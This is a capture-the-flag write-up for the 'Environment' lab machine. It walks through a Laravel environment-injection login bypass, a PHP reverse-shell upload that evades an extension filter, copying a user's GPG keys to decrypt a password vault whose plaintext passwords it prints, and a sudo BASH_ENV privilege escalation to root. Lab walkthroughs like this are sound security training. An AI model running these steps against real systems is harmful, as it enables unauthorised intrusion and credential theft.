# Environment

## Enumeration

We start by running `nmap` to check for open ports:

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Save the Environment | environment.htb
|_http-server-header: nginx/1.22.1
```

From the scan, we can see that only SSH and HTTP services are open.

Next, I checked the website, but found nothing interesting, so I started fuzzing the HTTP endpoints:

```sh
login [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 290ms] 
logout [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 262ms] 
up [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 264ms] 
storage [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 126ms] 
upload [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 381ms] 
build [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 200ms] 
vendor [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 138ms] 
mailing [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 1164ms]
```

From the fuzzing results, only the `login` page works. It is not vulnerable to SQL Injection, but it did display part of the source code when I attempted to remove the `password` and `remember` parameters.

Here is the snippet from the code:

```php
if($remember == 'False') {
    $keep_loggedin = False;
} elseif ($remember == 'True') {
    $keep_loggedin = True;
}
```

At this point, it seems the code is accepting random values. So, I tried assigning a random value to the remember parameter, which revealed another part of the source code:

```php
if(App::environment() == "preprod") { // QOL: login
    $request->session()->regenerate();
    $request->session()->put('user_id', 1); // Auto-login as admin
    return redirect('/management/dashboard');
}
```

I consulted AI about the code, and here's the response:

**Why this is vulnerable:**

**In production, this code should never execute.**

**However, if you can somehow force the app into preprod mode, or if it is accidentally left in that mode, you can bypass login completely.**

Since I knew the Laravel version, I started searching for known environment attacks and came across a **CVE: CVE-2024-52301**.

This CVE explains exactly what we need to do: inject --env=preprod into the ?login URL.

By doing so, we bypassed the login and were logged in as hish! 🎉

Notice that we can upload images , i upload a real image , the server gave us its path.\
wich is clearly a file upload vuln , i uploaded a php revshell and changed .php to .pHp\
to bypass the filter , visited the given url\
and i got a shell on my machine

```sh
┌──(2hemi㉿kali)-[~/Desktop]
└─$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.15.18] from (UNKNOWN) [10.10.11.67] 37820
Linux environment 6.1.0-34-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.135-1 (2025-04-25) x86_64 GNU/Linux
 23:38:05 up  1:21,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 
```

### **Step-by-Step Exploitation**

**( I could'nt crack database hashes)**

#### Initial Access (www-data Shell)

* Gained a shell as www-data (method depends on the machine's entry point).
* Found an interesting file: `/home/hish/backup/keyvault.gpg`

#### Analyzing the GPG File

* **Goal:** Decrypt `keyvault.gpg` to find sensitive data (passwords, keys, etc.).
* **Problem:** `www-data` cannot access `hish`'s GPG keys directly.

#### Extracting Hish's GPG Keys

1. **Located the** `.gnupg` directory in `/home/hish/.gnupg`.
2.  **Copied it to** `/tmp` (writable by `www-data`):

    ```sh
    cp -r /home/hish/.gnupg /tmp/2hemi
    chmod -R 700 /tmp/2hemi
    ```
3.  **Set** `GNUPGHOME` to the copied directory:

    ```sh
    export GNUPGHOME=/tmp/2hemi
    ```
4.  **Listed available GPG keys**:

    ```sh
    gpg --list-secret-keys
    ```

    * Output:

    ```sh
    sec rsa2048 2025-01-11 [SC]
        F45830DFB638E66CD8B752A012F42AE5117FFD8E
    uid [ultimate] hish_ <hish@environment.htb>
    ssb rsa2048 2025-01-11 [E]
    ```

#### Decrypting `keyvault.gpg`

*   **How GPG encryption works**: GPG (GNU Privacy Guard) uses public-key cryptography, where each user has a public and private key. The public key encrypts data, and only the corresponding private key can decrypt it. Additionally, GPG supports signing data, ensuring data integrity and authenticity.

    In this case, the file `keyvault.gpg` is encrypted using `hish`'s public key. Since we managed to obtain `hish`'s private key (by copying their `.gnupg` directory), we can decrypt the file.
*   **Attempted decryption with the private key**:

    ```bash
    gpg -d /home/hish/backup/keyvault.gpg
    ```
*   **No passphrase was needed** (key was unprotected):

    * Successfully decrypted the file, revealing credentials:

    ```txt
    PAYPAL.COM -> Ihaves0meMon$yhere123
    ENVIRONMENT.HTB -> marineSPm@ster!!
    FACEBOOK.COM -> summerSunnyB3ACH!!
    ```

#### Privilege Escalation (www-data → hish)

*   **Attempted** `su hish` with the password `marineSPm@ster!!`:

    ```bash
    su hish
    Password: marineSPm@ster!!
    ```

    * **Success!** Now had access as hish.

### Explanation of GPG and File Decryption

1. **Public Key Encryption:**
   * GPG uses asymmetric encryption, where the public key is used to encrypt data and the private key is used for decryption. The encrypted file (`keyvault.gpg`) can only be decrypted by someone who has access to the corresponding private key.
2. **How GPG Works:**
   * GPG creates key pairs (public and private). The public key is shared with others to encrypt data, while the private key stays secret and is used to decrypt the encrypted data.
   * When a file is encrypted using a public key, only the matching private key can decrypt it. This is a core principle of asymmetric encryption.
3. **Decryption Process:**
   * In this scenario, we copied the `.gnupg` directory from `/home/hish/` to `/tmp` (where `www-data` has write permissions).
   * After setting the `GNUPGHOME` environment variable to point to the copied directory, we were able to list and use the private keys to decrypt the `keyvault.gpg` file.
4. **Saving Decrypted Data:**
   * Once the file is decrypted, the data can be saved to a new file or used directly in the exploitation process. In this case, the passwords were extracted and used for further privilege escalation.

By using these decrypted credentials, we gained access to `hish`'s account and successfully escalated privileges from `www-data` to `hish`.

***

### 🔐 **Privilege Escalation Phase**

Now that we have access as the user `hish`, the first thing we should do is check what this user is allowed to run with `sudo`. This can show us if we can run any commands as another user (like root) without a password.

We run :

`sudo -l`

#### ✅ Output:

```bash
hish@environment:~$ sudo -l 
Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", 
use_pty User hish may run the following commands on environment: 
(ALL) /usr/bin/systeminfo
```

This means the user `hish` can run the command `/usr/bin/systeminfo` **as root**, using `sudo`, without a password.

***

### 📌 **Inspecting the Sudo Permissions**

Next, we look at the **sudo configuration** more carefully:

```
Matching Defaults entries for hish on environment:     env_keep+="ENV BASH_ENV"
```

This tells us something **very important**:

> When we use `sudo`, the `BASH_ENV` environment variable will **not be wiped**.

Normally, `sudo` clears most environment variables for security. But here, `BASH_ENV` is **kept**, which is a misconfiguration and gives us an opportunity.

***

### ⚙️ **What is BASH\_ENV and How It Helps**

`BASH_ENV` is a **special environment variable** used by Bash **only in non-interactive shells**.

If set, Bash will **automatically source (run)** the script or file defined in `BASH_ENV` **before** running the command.

Since `/usr/bin/systeminfo` is likely a Bash script, and since we can set `BASH_ENV`, we can make Bash execute **our malicious script** as root.

***

### 💣 **Exploitation Steps**

1. First, we create a malicious script that reads the root flag:

```sh
echo 'cat /root/root.txt' > /tmp/malicious_script.sh 
chmod +x /tmp/malicious_script.sh
```

2. Then, we export the `BASH_ENV` variable to point to our script:

```sh
export BASH_ENV=/tmp/malicious_script.sh
```

3. Finally, we run the allowed command with `sudo`:

```sh
sudo /usr/bin/systeminfo
```

Since the environment is configured to **keep `BASH_ENV`**, and the command starts a **non-interactive Bash shell**, our script gets executed silently.

#### 🏁 Output:

`c1dd175badabe0f3e2ba1299cef1d143` + **systeminfo results**

🎉 **That’s the root flag! We have successfully escalated privileges.**

***
